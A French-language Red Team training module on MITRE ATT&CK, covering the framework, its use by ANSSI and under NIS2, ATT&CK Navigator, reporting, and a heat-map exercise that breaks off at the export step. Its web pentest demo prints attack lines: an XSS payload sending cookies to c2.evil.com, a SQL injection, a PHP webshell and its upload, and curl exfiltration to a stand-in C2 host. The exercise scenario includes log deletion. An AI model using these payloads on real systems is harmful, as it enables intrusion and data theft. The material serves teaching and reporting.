# Module 1 — MITRE ATT&CK : Framework de Référence pour la Cybersécurité Offensive

---

**Formation Red Team — SDV M2 2026**  
**Durée estimée : 4 h (cours) + 2 h (TP)**

---

## Table des matières

1. [Qu'est-ce que MITRE ATT&CK ?](#1-quest-ce-que-mitre-attck-)
2. [Structure : Tactiques → Techniques → Sub-techniques → Procédures](#2-structure--tactiques--techniques--sub-techniques--procédures)
3. [Utilisation militaire & ANSSI](#3-utilisation-militaire--anssi)
4. [Lien avec NIS2](#4-lien-avec-nis2)
5. [ATT&CK Navigator — Installation et utilisation](#5-attck-navigator--installation-et-utilisation)
6. [Application au pentest web — Démo live](#6-application-au-pentest-web--dmo-live)
7. [ATT&CK comme outil de reporting](#7-attck-comme-outil-de-reporting)
8. [TP Pratique : Créer une heat map ATT&CK](#8-tp-pratique--crer-une-heat-map-attck)

---

## 1. Qu'est-ce que MITRE ATT&CK ?

### 1.1 Origine

**MITRE Corporation** est une organisation américaine à but non lucratif qui gère des centres de recherche financés par le gouvernement fédéral (Federally Funded Research and Development Centers — FFRDC). Elle est notamment connue pour son rôle dans la gestion des **CVE** (Common Vulnerabilities and Exposures).

MITRE ATT&CK est un acronyme qui signifie **Adversarial Tactics, Techniques, and Common Knowledge**. Le projet commence en **2013** avec l'objectif de documenter les comportements observés d'attaquants réels, en particulier ceux ciblant **Windows Enterprise networks**. La version initiale (PRE-ATT&CK) se concentre sur les phases amont d'une attaque.

> **Philosophie fondatrice :** ATT&CK décrit **ce que fait l'attaquant** (comportements, intentions), pas **les outils qu'il utilise**. On parle de *TTPs* (Tactics, Techniques, Procedures). Cette approche permet de rester pertinente même quand les outils évoluent.

### 1.2 Chiffres clés (2025-2026)

| Métrique | Valeur |
|---|---|
| Techniques | 200+ |
| Sous-techniques (sub-techniques) | 400+ |
| Tactiques (Enterprise) | 14 |
| Groupes APT documentés | 140+ |
| Logiciels malveillants référencés | 700+ |
| Campagnes | 800+ |
| Mitigations | 50+ |
| Détections | 40+ |

### 1.3 Les 3 matrices

MITRE ATT&CK se décline en **trois matrices** distinctes, adaptées à différents environnements :

| Matrice | Cible | Tactiques | Particularité |
|---|---|---|---|
| **Enterprise** | Systèmes d'information d'entreprise (Windows, macOS, Linux, Cloud, Network) | 14 | La plus complète, couvre l'ensemble du kill chain |
| **Mobile** | Appareils mobiles (Android, iOS) | 14 | Inclut les attaques par carte SIM, NFC, etc. |
| **ICS** | Systèmes industriels et SCADA | 12 | Adaptée aux spécificités des ICS (ex : Inhibit Response Function) |

**Liens officiels :**

- Matrice Enterprise : [https://attack.mitre.org/matrices/enterprise/](https://attack.mitre.org/matrices/enterprise/)
- Matrice Mobile : [https://attack.mitre.org/matrices/mobile/](https://attack.mitre.org/matrices/mobile/)
- Matrice ICS : [https://attack.mitre.org/matrices/ics/](https://attack.mitre.org/matrices/ics/)

---

## 2. Structure : Tactiques → Techniques → Sub-techniques → Procédures

### 2.1 Hiérarchie

La taxonomie ATT&CK repose sur une hiérarchie à quatre niveaux :

```
Tactique (le "Pourquoi")
    └── Technique (le "Quoi")
            └── Sous-technique (le "Comment" précis)
                    └── Procédure (l'exemple concret)
```

### 2.2 Les 14 tactiques Enterprise

Chaque tactique représente un **objectif stratégique** de l'attaquant dans le déroulement d'une opération.

| # | Tactique | Code | Description |
|---|---|---|---|
| 1 | **Reconnaissance** | TA0043 | Rassembler des informations sur la cible avant l'attaque (OSINT, scanning) |
| 2 | **Resource Development** | TA0042 | Développer / acquérir des ressources pour l'opération (domaines, C2, payloads) |
| 3 | **Initial Access** | TA0001 | Obtenir un premier point d'entrée sur le réseau cible |
| 4 | **Execution** | TA0002 | Exécuter du code malveillant sur le système cible |
| 5 | **Persistence** | TA0003 | Maintenir un accès malgré les redémarrages ou changements de credentials |
| 6 | **Privilege Escalation** | TA0004 | Obtenir des droits plus élevés sur le système |
| 7 | **Defense Evasion** | TA0005 | Éviter la détection (bypass AV, EDR, logging) |
| 8 | **Credential Access** | TA0006 | Voler des identifiants (mots de passe, tokens, hashs) |
| 9 | **Discovery** | TA0007 | Explorer l'environnement (utilisateurs, systèmes, services) |
| 10 | **Lateral Movement** | TA0008 | Se déplacer d'un système à un autre sur le réseau |
| 11 | **Collection** | TA0009 | Rassembler les données d'intérêt avant exfiltration |
| 12 | **Command and Control** | TA0011 | Établir un canal de communication avec les systèmes compromis |
| 13 | **Exfiltration** | TA0010 | Voler les données hors du réseau cible |
| 14 | **Impact** | TA0040 | Détruire, corrompre, ou perturber les systèmes / données |

### 2.3 Format des codes

Chaque élément possède un identifiant unique :

| Préfixe | Signification | Exemple |
|---|---|---|
| TA | Tactique | TA0001 = Initial Access |
| T | Technique | T1078 = Valid Accounts |
| TXXXX.XXX | Sous-technique | T1078.001 = Default Accounts |
| S | Software (malware / tool) | S0029 = Mimikatz |
| G | Group (APT) | G0001 = APT1 |
| M | Mitigation | M1047 = Audit |

### 2.4 Exemple de chaîne complète

Prenons l'exemple d'un ransomware ciblant une entreprise :

```
TA0043 (Reconnaissance)
    └── T1595 (Active Scanning)
        └── T1595.001 (Scanning IP Blocks)
        └── T1595.002 (Vulnerability Scanning)

TA0001 (Initial Access)
    └── T1566 (Phishing)
        └── T1566.001 (Spearphishing Attachment)
            └── Procédure : Email avec macro Office malveillante

TA0002 (Execution)
    └── T1204 (User Execution)
        └── T1204.002 (Malicious File)

TA0003 (Persistence)
    └── T1547 (Boot/Logon Autostart Execution)
        └── T1547.001 (Registry Run Keys / Startup Folder)

TA0004 (Privilege Escalation)
    └── T1068 (Exploitation for Privilege Escalation)

TA0005 (Defense Evasion)
    └── T1055 (Process Injection)
    └── T1562 (Impair Defenses)

TA0006 (Credential Access)
    └── T1003 (OS Credential Dumping)
        └── T1003.001 (LSASS Memory)

TA0007 (Discovery)
    └── T1018 (Remote System Discovery)
    └── T1083 (File and Directory Discovery)

TA0008 (Lateral Movement)
    └── T1021 (Remote Services)
        └── T1021.001 (Remote Desktop Protocol)

TA0009 (Collection)
    └── T1560 (Archive Collected Data)

TA0011 (Command and Control)
    └── T1071 (Application Layer Protocol)
        └── T1071.001 (Web Protocols)

TA0010 (Exfiltration)
    └── T1048 (Exfiltration Over Alternative Protocol)

TA0040 (Impact)
    └── T1486 (Data Encrypted for Impact)
    └── T1490 (Inhibit System Recovery)
```

Chaque étape correspond à un nœud dans la matrice ATT&CK que l'on peut colorer dans l'ATT&CK Navigator pour visualiser la couverture.

---

## 3. Utilisation militaire & ANSSI

### 3.1 COMCYBER et la doctrine LID

Le **Commandement de la Cyberdéfense (COMCYBER)** est l'organisme militaire français en charge de la cyberdéfense. Il s'appuie sur la **LID (Lutte Informatique Défensive)**.

**Points clés :**

- La LID se structure en 3 piliers : **Protection, Détection, Réaction**
- ATT&CK est utilisé comme **langage commun** entre les différentes entités de défense (COMCYBER, ANSSI, DGSE)
- Les tactiques ATT&CK sont mappées sur les phases de la LID :

```
LID - Protection    →  TA0003 (Persistence) → Hardening
LID - Détection     →  TA0007 (Discovery)  → Logs / SIEM
LID - Réaction      →  TA0040 (Impact)      → Incident Response
```

- **Exercices PEGASE** : exercices interarmées de cyberdéfense où ATT&CK sert de référentiel d'évaluation.

### 3.2 ANSSI

L'**Agence Nationale de la Sécurité des Systèmes d'Information (ANSSI)** intègre ATT&CK dans plusieurs de ses référentiels :

| Référentiel | Rôle d'ATT&CK |
|---|---|
| **PASSI** (Prestataires d'Audit de la Sécurité des SI) | Les PASSI doivent connaître ATT&CK pour réaliser des audits conformes au référentiel |
| **Guide d'hygiène informatique** | Les 42 mesures sont mappables sur les techniques ATT&CK (ex : mesure 12 "Authentification forte" → T1078 mitigation) |
| **RGS** (Référentiel Général de Sécurité) | ATT&CK aide à justifier les choix de sécurité |
| **Cartographie des risques** | Utilisé en analyse de risque pour identifier les TTPs pertinentes |

**Liens utiles ANSSI :**

- Guide d'hygiène : [https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/](https://www.ssi.gouv.fr/guide/guide-dhygiene-informatique/)
- Référentiel PASSI : [https://www.ssi.gouv.fr/entreprise/prestataires-cybersecurite/passi/](https://www.ssi.gouv.fr/entreprise/prestataires-cybersecurite/passi/)

### 3.3 OTAN : Threat Intelligence partagée

L'**OTAN** utilise ATT&CK comme standard de facto pour le partage de renseignement sur les menaces entre les États membres :

- **NCSC** (NATO Cyber Security Centre) : centralise les alertes et utilise les TTPs ATT&CK pour qualifier les incidents
- **STIX / TAXII** : le format STIX 2.1 intègre nativement les identifiants ATT&CK (campaign, threat-actor, attack-pattern)
- **Grands exercices OTAN** (Locked Shields, Cyber Coalition) : évaluent la capacité des équipes à détecter et répondre aux TTPs ATT&CK

**Exemple de mapping STIX → ATT&CK :**

```json
{
    "type": "attack-pattern",
    "id": "attack-pattern--b21c3b2b-c755-4787-9c5d-7306e0f9b6e5",
    "name": "Phishing",
    "external_references": [{
        "source_name": "mitre-attack",
        "external_id": "T1566"
    }]
}
```

### 3.4 DGA : Cahiers des charges

La **Direction Générale de l'Armement (DGA)** intègre ATT&CK dans ses **cahiers des charges** pour les marchés publics de cybersécurité :

- Exigence de **couverture ATT&CK** pour les solutions EDR / XDR
- Tests d'intrusion basés sur des scénarios ATT&CK (Red Teaming)
- Notation des offres selon leur capacité à détecter / bloquer les TTPs du framework

**Extrait type d'un CDC DGA :**

> "Le prestataire démontrera la couverture de sa solution contre au moins 80 % des techniques de la matrice ATT&CK Enterprise listées en annexe B, en fournissant une heat map générée par ATT&CK Navigator."

---

## 4. Lien avec NIS2

### 4.1 Contexte

La directive européenne **NIS2 (Network and Information Security 2)** est entrée en vigueur le **16 janvier 2023**. Les États membres avaient jusqu'au **17 octobre 2024** pour la transposer en droit national. En France, la transposition a été faite via la **loi de transposition NIS2** et les décrets associés.

### 4.2 Article 21 — Gestion des risques

L'article 21 impose aux entités essentielles et importantes de mettre en œuvre des **mesures techniques, opérationnelles et organisationnelles** pour gérer les risques cyber.

**Lien direct avec ATT&CK :**

| Exigence NIS2 Article 21 | Corrélation ATT&CK |
|---|---|
| Analyse des risques | ATT&CK fournit le catalogue des risques (les TTPs) |
| Politique de sécurité | Les tactiques définissent le périmètre de couverture |
| Gestion des incidents | ATT&CK permet de qualifier le stade d'une attaque |
| Continuité d'activité | Mapping des techniques Impact (TA0040) |
| Sécurité de la chaîne d'approvisionnement | Techniques liées aux dépendances tierces |
| Acquisition / développement sécurisé | Mapping sur les techniques Initial Access |
| Politique de mots de passe | T1078 (Valid Accounts) mitigation |
| Formation | Sensibilisation basée sur les TTPs |

**Exemple de gap analysis avec ATT&CK :**

```
Exigence NIS2 : "Détection des accès non autorisés"
    → Techniques ATT&CK concernées :
        - T1078 (Valid Accounts)
        - T1133 (External Remote Services)
        - T1190 (Exploit Public-Facing Application)
    → Si le SIEM ne couvre que T1190 → gap sur T1078 et T1133
    → Plan d'action : ajouter des règles de détection sur les authentifications anormales
```

### 4.3 Article 23 — Notification des incidents

L'article 23 impose des délais de notification stricts :

| Délai | Action |
|---|---|
| **24 h** | Alerte précoce vers le CSIRT / autorité compétente |
| **72 h** | Notification complète (cause, impact, mesures prises) |
| **1 mois** | Rapport final détaillé |

**Utilisation d'ATT&CK pour la qualification des incidents :**

```yaml
Incident: AL-2026-04-15
Description: Dépôt de ransomware détecté sur le serveur ERP
Timeline:
  - H+0:  Détection par EDR (T1055 - Process Injection détecté)
  - H+2:  Qualification PREV (alerte précoce) : TA0040 (Impact) en cours
  - H+24: Notification initiale au CSIRT : T1486 (Data Encrypted for Impact)
  - H+72: Rapport complet incluant l'ensemble des TTPs observées
```

**Avantage d'ATT&CK pour le reporting NIS2 :** un même langage entre l'entreprise, le CSIRT, et l'autorité de régulation (ANSSI pour la France).

---

## 5. ATT&CK Navigator — Installation et utilisation

### 5.1 Qu'est-ce que l'ATT&CK Navigator ?

L'**ATT&CK Navigator** est un outil web open source développé par MITRE qui permet de visualiser, annoter et manipuler les matrices ATT&CK. Il est utilisé pour :

- Créer des **heat maps** de couverture (détection, protection, test)
- Comparer plusieurs couches (layers) entre elles
- Exporter les configurations au format **JSON**
- Partager des vues avec son équipe

### 5.2 Installation

#### Prérequis

- Git
- Docker (recommandé) ou Node.js 18+ + npm

#### Méthode 1 : Docker (recommandée)

```bash
# Étape 1 : Cloner le dépôt officiel
git clone https://github.com/mitre-attack/attack-navigator.git

# Étape 2 : Se placer dans le répertoire
cd attack-navigator

# Étape 3 : Construire l'image Docker
# Le Dockerfile se trouve à la racine du projet
docker build -t attack-navigator .

# Étape 4 : Lancer le conteneur
# Le port 4200 est utilisé par défaut (port d'écoute de l'application Angular)
docker run -d -p 4200:4200 --name attack-navigator attack-navigator

# Étape 5 : Accéder à l'interface
# Ouvrir un navigateur à l'adresse : http://localhost:4200
```

**Explication des commandes Docker :**

| Option | Signification |
|---|---|
| `-t` | Tag de l'image (nom) |
| `-d` | Détaché (tourne en arrière-plan) |
| `-p 4200:4200` | Mappe le port 4200 du conteneur vers le port 4200 de l'hôte |
| `--name` | Nom du conteneur |

#### Méthode 2 : Node.js (alternative)

```bash
# Étape 1 : Cloner le dépôt
git clone https://github.com/mitre-attack/attack-navigator.git

# Étape 2 : Se placer dans le répertoire
cd attack-navigator

# Étape 3 : Installer les dépendances
npm install

# Étape 4 : Lancer le serveur de développement
npm start

# Étape 5 : Accéder à l'interface
# http://localhost:4200
```

### 5.3 Utilisation basique

#### Créer une heat map

1. Ouvrir [http://localhost:4200](http://localhost:4200)
2. Cliquer sur **"Create Layer"**
3. Choisir la matrice **"Enterprise"**
4. Utiliser la barre de recherche pour trouver des techniques (ex : `T1566`)
5. Cliquer droit sur une technique → **"Assign Score"**
6. Définir un score (0-100) qui déterminera l'intensité de la couleur
7. Répéter pour chaque technique à annoter

#### Personnalisation des couleurs

Pour modifier la palette de couleurs d'une heat map :

1. Ouvrir le panneau **"Layer Settings"** (icône engrenage)
2. Dans **"Gradient Type"** choisir un dégradé prédéfini
3. Cliquer sur un point du gradient pour modifier sa couleur
4. Les techniques sans score sont grisées par défaut

#### Exporter / Importer une couche

```bash
# Export du fichier JSON depuis l'interface
# 1. Cliquer sur l'icône "Download" (⬇) dans la barre d'outils
# 2. Choisir "Download as JSON"
# 3. Enregistrer le fichier (ex: heatmap_detection.json)
```

**Import d'une couche existante :**

```bash
# 1. Cliquer sur "Open Existing Layer" → "Upload from file"
# 2. Sélectionner le fichier JSON
# 3. La couche s'affiche avec toutes ses annotations
```

### 5.4 Format du fichier JSON

Exemple de fichier de couche ATT&CK Navigator :

```json
{
    "name": "Couverture Détection - SIEM",
    "version": "4.0",
    "domain": "mitre-enterprise",
    "description": "Heat map de couverture détection pour le SIEM Splunk",
    "techniques": [
        {
            "techniqueID": "T1566",
            "color": "#e66363",
            "score": 80,
            "comment": "Détection phishing par analyse des pièces jointes"
        },
        {
            "techniqueID": "T1059",
            "color": "#f5b042",
            "score": 45,
            "comment": "Détection partielle des scripts PowerShell"
        },
        {
            "techniqueID": "T1003",
            "color": "#b0e0b0",
            "score": 10,
            "comment": "Pas de détection du credential dumping"
        }
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["windows"]
    },
    "sorting": 0,
    "viewMode": 0,
    "hideDisabled": false
}
```

**Légende des couleurs par score :**

| Score | Niveau de couverture | Couleur |
|---|---|---|
| 0-20 | Non couvert | Vert clair |
| 21-50 | Partiellement couvert | Jaune / Orange |
| 51-80 | Majoritairement couvert | Orange foncé |
| 81-100 | Entièrement couvert | Rouge |

---

## 6. Application au pentest web — Démo live

### 6.1 Kill chain web complète

Voici une chaîne d'attaque web réaliste d'un **Red Team** contre une application web d'e-commerce, mappée sur MITRE ATT&CK :

#### Phase 1 : Reconnaissance (TA0043)

```bash
# Scan des sous-domaines
ffuf -u https://cible.com -w subdomains.txt -H "Host: FUZZ.cible.com" -fc 301

# Découverte des endpoints API
gau --o cible.com | grep "/api/"
```

| Technique | Code | Description |
|---|---|---|
| Gather Victim Identity Information | **T1589** | Collecte des emails employés |
| Search Open Technical Databases | **T1596** | Recherche dans les bases de données OSINT |
| Active Scanning | **T1595** | Scan de ports et de vulnérabilités |

#### Phase 2 : Resource Development (TA0042)

```bash
# Configuration d'un serveur C2 avec HTTPS
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/c2.key \
    -out /etc/ssl/c2.crt \
    -subj "/CN=maj-logiciel-update.com"

# Hébergement d'un payload
python3 -m http.server 443
```

| Technique | Code | Description |
|---|---|---|
| Acquire Infrastructure | **T1583** | Achat de domaine malveillant |
| Develop Capabilities | **T1587** | Développement d'exploit custom |

#### Phase 3 : Initial Access (TA0001)

```python
# Payload XSS stocké envoyé via un formulaire de contact
<script>fetch('https://c2.evil.com/steal?c='+document.cookie)</script>
```

| Technique | Code | Description |
|---|---|---|
| Exploit Public-Facing Application | **T1190** | Exploitation d'une faille XSS |

#### Phase 4 : Execution (TA0002) + Defense Evasion (TA0005)

```sql
-- Injection SQL dans le paramètre 'id'
' UNION SELECT null,username,password,null FROM users-- -
```

```javascript
// Obfuscation JavaScript pour contourner les WAF
eval(atob("ZmV0Y2goJy8uLi8uLi8uLi9ldGMvcGFzc3dkJyk="))
```

| Technique | Code | Description |
|---|---|---|
| Command and Scripting Interpreter | **T1059** | Injection SQL via interpréteur SQL |
| Obfuscated Files or Information | **T1027** | JavaScript obfusqué |

#### Phase 5 : Persistence (TA0003) + Privilege Escalation (TA0004)

```python
# Création d'un webshell pour persistance
<?php system($_GET['cmd']); ?>
```

```bash
# Upload du webshell
curl -X POST -F "file=@shell.php" https://cible.com/uploads/
```

| Technique | Code | Description |
|---|---|---|
| Server Software Component | **T1505** | Webshell déposé sur le serveur web |
| Abuse Elevation Control Mechanism | **T1548** | Exploitation d'un binaire suid après webshell |

#### Phase 6 : Credential Access (TA0006) + Discovery (TA0007)

```bash
# Dump des hashs depuis le fichier de configuration
cat /var/www/html/config.php | grep -E "DB_PASSWORD|DB_USER"

# Découverte des autres machines du réseau
for i in $(seq 1 254); do ping -c 1 10.0.0.$i | grep "bytes from" & done
```

| Technique | Code | Description |
|---|---|---|
| Unsecured Credentials | **T1552** | Credentials en clair dans les fichiers |
| Network Service Discovery | **T1046** | Scan du réseau interne |

#### Phase 7 : Lateral Movement (TA0008) + Collection (TA0009)

```bash
# Connexion SSH avec les identifiants volés
ssh admin@10.0.0.25

# Compression des fichiers sensibles avant exfiltration
tar czf data.tar.gz /var/backups/sql/
```

| Technique | Code | Description |
|---|---|---|
| Remote Services | **T1021** | SSH pour mouvement latéral |
| Archive Collected Data | **T1560** | Compression des données volées |

#### Phase 8 : Command and Control (TA0011)

```bash
# Communication C2 via DNS tunneling
nslookup -type=TXT exfil.c2-domain.com

# Exfiltration via HTTP POST
curl -X POST -d @data.tar.gz https://c2.evil.com/exfil
```

| Technique | Code | Description |
|---|---|---|
| Application Layer Protocol | **T1071** | C2 via HTTPS (ressemble à du trafic légitime) |
| Protocol Tunneling | **T1572** | DNS tunneling pour contourner les filtres |

### 6.2 Tableau des techniques ATT&CK clés en pentest web

| Technique | Code | Sous-technique | Usage en pentest web |
|---|---|---|---|
| Exploit Public-Facing Application | **T1190** | — | Faille dans l'applicatif web (SQLi, XSS, RCE, LFI) |
| Valid Accounts | **T1078** | .003 (Local Accounts) | Utilisation de comptes par défaut ou volés |
| Phishing | **T1566** | .002 (Spearphishing Link) | Lien malveillant envoyé aux employés |
| Drive-by Compromise | **T1189** | — | Compromission via navigateur (watering hole) |
| External Remote Services | **T1133** | — | VPN, RDP, Citrix exposés |
| Command and Scripting Interpreter | **T1059** | .004 (Unix Shell), .007 (JavaScript) | Exécution de commandes via webshell, SSRF |
| User Execution | **T1204** | .002 (Malicious File) | Victime ouvre un fichier malveillant |
| Server Software Component | **T1505** | .003 (Web Shell) | Webshell déposé sur le serveur |
| OS Credential Dumping | **T1003** | .001 (LSASS Memory), .003 (NTDS) | Vol de hashs Windows |
| Unsecured Credentials | **T1552** | .001 (Credentials In Files) | Mots de passe en clair dans configs |
| Archive Collected Data | **T1560** | .001 (Archive via Utility) | Compression des données exfiltrées |
| Exfiltration Over Web Service | **T1567** | .002 (Exfiltration to Cloud Storage) | Envoi des données vers un service cloud |
| Data Encrypted for Impact | **T1486** | — | Chiffrement ransomware |
| Indicator Removal on Host | **T1070** | .003 (Clear Command History) | Nettoyage des logs après action |

---

## 7. ATT&CK comme outil de reporting

### 7.1 Matrice de couverture

En fin de mission, le Red Team présente une **matrice de couverture** qui répond à trois questions :

1. **Qu'avons-nous testé ?** (techniques utilisées pendant l'engagement)
2. **Qu'avons-nous détecté ?** (techniques détectées par la défense)
3. **Qu'avons-nous réussi à exploiter ?** (techniques ayant abouti)

**Exemple de tableau de couverture :**

| Tactique | Technique | Testé | Détecté | Exploité | Commentaire |
|---|---|---|---|---|---|
| Initial Access | T1190 (Exploit Public-Facing App) | ✅ | ❌ | ✅ | SQLi non détectée par le WAF |
| Execution | T1059 (Command & Scripting Interpreter) | ✅ | ✅ | ✅ | Webshell détecté après 2h |
| Persistence | T1505.003 (Web Shell) | ✅ | ❌ | ✅ | Webshell toujours actif en fin de test |
| Credential Access | T1003 (OS Credential Dumping) | ✅ | ✅ | ❌ | Détecté par EDR – pas de dump réussi |
| Impact | T1486 (Data Encrypted for Impact) | ❌ | N/A | N/A | Hors scope |

### 7.2 Gap analysis

La **gap analysis** compare l'état actuel de la défense (baseline) avec l'état souhaité (target).

```bash
# Script simple de comparaison entre deux fichiers JSON de couches Navigator
# Ce script compare une couche "actuelle" et une couche "cible"
# et identifie les techniques non couvertes

cat compare_layers.py
```

```python
#!/usr/bin/env python3
"""
compare_layers.py — Compare deux couches ATT&CK Navigator

Usage :
    python3 compare_layers.py current.json target.json

Ce script identifie les techniques présentes dans la couche cible
mais absentes ou faiblement scorées dans la couche actuelle.
"""

import json
import sys

def load_layer(filepath):
    with open(filepath, 'r') as f:
        data = json.load(f)
    techniques = {}
    for t in data.get('techniques', []):
        techniques[t['techniqueID']] = {
            'score': t.get('score', 0),
            'comment': t.get('comment', '')
        }
    return techniques

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 compare_layers.py current.json target.json")
        sys.exit(1)

    current = load_layer(sys.argv[1])
    target = load_layer(sys.argv[2])

    print("=" * 80)
    print("GAP ANALYSIS — Techniques cibles non couvertes ou sous-couvertes")
    print("=" * 80)

    gap_found = False
    for tech_id, tech_data in target.items():
        current_score = current.get(tech_id, {}).get('score', 0)
        target_score = tech_data['score']

        if current_score < target_score:
            gap_found = True
            gap = target_score - current_score
            status = "ABSENTE" if current_score == 0 else f"SOUS-COUVERTE (gap: {gap} pts)"
            print(f"\n{tech_id} — {status}")
            print(f"  Score actuel : {current_score}/100")
            print(f"  Score cible   : {target_score}/100")
            print(f"  Commentaire cible : {tech_data['comment']}")

    if not gap_found:
        print("\n✅ Toutes les techniques cibles sont couvertes.")

if __name__ == "__main__":
    main()
```

```bash
# Exécution du script
python3 compare_layers.py detection_current.json nis2_target.json
```

**Sortie typique :**

```
================================================================================
GAP ANALYSIS — Techniques cibles non couvertes ou sous-couvertes
================================================================================

T1190 — ABSENTE
  Score actuel : 0/100
  Score cible   : 80/100
  Commentaire cible : Détection des exploits applicatifs (WAF + RASP)

T1505.003 — SOUS-COUVERTE (gap: 55 pts)
  Score actuel : 25/100
  Score cible   : 80/100
  Commentaire cible : Détection des webshells par analyse de comportement
```

### 7.3 Rapport exécutif vs rapport technique

| Élément | Rapport Exécutif (Dirigeant) | Rapport Technique (Ops) |
|---|---|---|
| Public | DSI, COMEX, RSSI | Analystes SOC, ingénieurs sécurité |
| Niveau de détail | Synthétique | Très détaillé |
| Utilisation ATT&CK | Heat map globale par tactique | Liste exhaustive des TTPs |
| Métriques | % de couverture, score global | Gap analysis par technique |
| Livrables | PDF + Heat map PNG | JSON Navigator + règles Sigma |
| Durée de lecture | 2-3 pages | 30-50 pages |

**Structure d'un rapport exécutif avec ATT&CK :**

```
1. Résumé exécutif
   - Objectif de l'engagement
   - Périmètre testé
   - Score de sécurité global (ex : 62/100)

2. Synthèse visuelle
   - Heat map ATT&CK Navigator (niveau tactique)
   - Top 5 des techniques les plus critiques non couvertes

3. Recommandations prioritaires
   - Par ordre d'impact sur la couverture ATT&CK
   - Budget estimé

4. Annexes
   - Heat map détaillée (niveau technique)
   - Fichier JSON de la couche
   - Calendrier de remediation
```

**Structure d'un rapport technique avec ATT&CK :**

```
1. Périmètre et méthodologie
   - Matrice ATT&CK utilisée (Enterprise v14)
   - Liste des techniques testées avec codes TXXXX

2. Chronologie de l'attaque
   - Timeline avec les tactiques ATT&CK atteintes
   - Pour chaque étape : technique, procédure, résultat

3. Détail des techniques exploitées
   - T1190 : Exploitation SQLi (CVSS 9.8)
   - T1505.003 : Webshell JSP déposé
   - T1021.004 : Mouvement latéral SSH

4. Détection et remédiation
   - Par technique : règles de détection proposées (Sigma, Splunk, KQL)
   - Configuration de durcissement

5. Fichier de couche ATT&CK
   - JSON Navigator complet
   - Instructions d'import
```

---

## 8. TP Pratique : Créer une heat map ATT&CK

### 8.1 Objectif

À partir d'un **scénario de compromission** (un pentest web sur une application bancaire fictive), vous allez :

1. Analyser le scénario et identifier les TTPs utilisées
2. Installer et lancer ATT&CK Navigator
3. Créer une heat map annotée
4. Exporter la couche au format JSON
5. Interpréter les résultats

### 8.2 Scénario de compromission : "Opération CaisseNoire"

**Contexte :** Vous êtes Red Team sur l'application **BanX** (banque en ligne). Votre mission est de tester la détection de l'équipe SOC. Voici le déroulé de votre attaque :

```
Phase 1 — Reconnaissance (Jour 1)
    → Scan Shodan pour trouver les IPs exposées de BanX
    → Découverte de : 185.23.45.67 (portail web), 185.23.45.78 (API)

Phase 2 — Initial Access (Jour 2)
    → SQL Injection sur l'endpoint /api/v1/transfer?account_id=1 UNION SELECT...
    → Extraction de 12 000 comptes utilisateurs (hashs bcrypt + emails)

Phase 3 — Exécution (Jour 2)
    → Upload d'un webshell PHP via une faille de téléchargement sur /uploads/profile.php
    → Commande exécutée : whoami → www-data

Phase 4 — Persistence + Privilege Escalation (Jour 3)
    → Webshell conservé dans /var/www/html/uploads/shell.php
    → Exploitation CVE-2024-XXXX sur le kernel → passage root

Phase 5 — Credential Access (Jour 3)
    → Dump de /etc/shadow (11 comptes root, oracle, admin, backup)
    → Crack de 3 mots de passe : admin / Pa\$\$w0rd! / backup / B@ckup2024!

Phase 6 — Movement (Jour 4)
    → Connexion SSH vers le serveur de base de données (10.0.1.50) avec les credentials root
    → Dump de la base de données : mysqldump --all-databases > dump.sql

Phase 7 — Exfiltration (Jour 4)
    → Compression du dump : tar czf dump.tar.gz dump.sql (taille : 2.3 Go)
    → Transfert via scp vers un serveur Cloud external (serveur vps hébergé)

Phase 8 — Nettoyage (Jour 4)
    → Suppression des logs : rm -rf /var/log/apache2/access.log
    → Suppression de l'historique bash : history -c
```

### 8.3 Travail à réaliser

**Étape 1 : Identifier les TTPs** (15 min)

Pour chaque phase du scénario, identifiez les codes ATT&CK correspondants.

Utilisez le site [https://attack.mitre.org](https://attack.mitre.org) ou le fichier de cours ci-dessus.

**Correction :**

| Phase | Action | Technique | Code | Sous-technique |
|---|---|---|---|---|
| 1 | Scan Shodan | Search Open Technical Databases | **T1596** | .001 (DNS/Passive DNS) |
| 2 | SQL Injection | Exploit Public-Facing Application | **T1190** | — |
| 3 | Webshell upload | Server Software Component | **T1505** | .003 (Web Shell) |
| 3 | whoami | Command and Scripting Interpreter | **T1059** | .004 (Unix Shell) |
| 4 | Webshell conservé | Server Software Component | **T1505** | .003 (Web Shell) |
| 4 | Exploit kernel | Exploitation for Privilege Escalation | **T1068** | — |
| 5 | Dump /etc/shadow | OS Credential Dumping | **T1003** | — |
| 5 | Crack mots de passe | Brute Force | **T1110** | .002 (Password Cracking) |
| 6 | SSH vers DB | Remote Services | **T1021** | .004 (SSH) |
| 6 | mysqldump | Data from Information Repositories | **T1213** | — |
| 7 | Compression | Archive Collected Data | **T1560** | .001 (Archive via Utility) |
| 7 | Transfert SCP | Exfiltration Over Alternative Protocol | **T1048** | .002 (Exfiltration Over Asymmetric Encrypted Non-C2 Protocol) |
| 8 | Suppression logs | Indicator Removal on Host | **T1070** | .003 (Clear Command History) |

**Étape 2 : Installer ATT&CK Navigator** (15 min)

Suivez les instructions de la section 5 avec Docker.

```bash
# Vérifier que Docker est installé
docker --version

# Cloner le dépôt
git clone https://github.com/mitre-attack/attack-navigator.git
cd attack-navigator

# Build l'image
docker build -t attack-navigator .

# Lancer le conteneur
docker run -d -p 4200:4200 --name attack-navigator attack-navigator

# Vérifier que le conteneur tourne
docker ps | grep attack-navigator

# Accéder : http://localhost:4200
```

**Étape 3 : Créer la heat map** (20 min)

1. Ouvrir [http://localhost:4200](http://localhost:4200)
2. Cliquer sur **"Create Layer"** → **"Enterprise"**
3. Nommer la couche : `Opération CaisseNoire - Red Team BanX`
4. Ajouter les techniques identifiées :

| Technique | Score | Commentaire |
|---|---|---|
| T1596.001 | 90 | Scan Shodan — OSINT passif |
| T1190 | 100 | SQL Injection critique — accès initial |
| T1505.003 | 95 | Webshell PHP uploadé |
| T1059.004 | 70 | Exécution de commandes shell |
| T1068 | 85 | Exploit kernel CVE-2024-XXXX |
| T1003 | 90 | Dump /etc/shadow |
| T1110.002 | 75 | Crack de mots de passe |
| T1021.004 | 80 | SSH lateral movement |
| T1213 | 80 | Dump base de données via mysqldump |
| T1560.001 | 70 | Compression des données exfiltrées |
| T1048.002 | 95 | Exfiltration SCP vers serveur externe |
| T1070.003 | 85 | Suppression des logs |

5. Pour chaque technique, cliquer droit → **"Assign Score"** → entrer le score
6. Optionnel : ajouter des commentaires dans **"Assign Comment"**

**Étape 4 : Exporter la couche** (5 min)

```bash
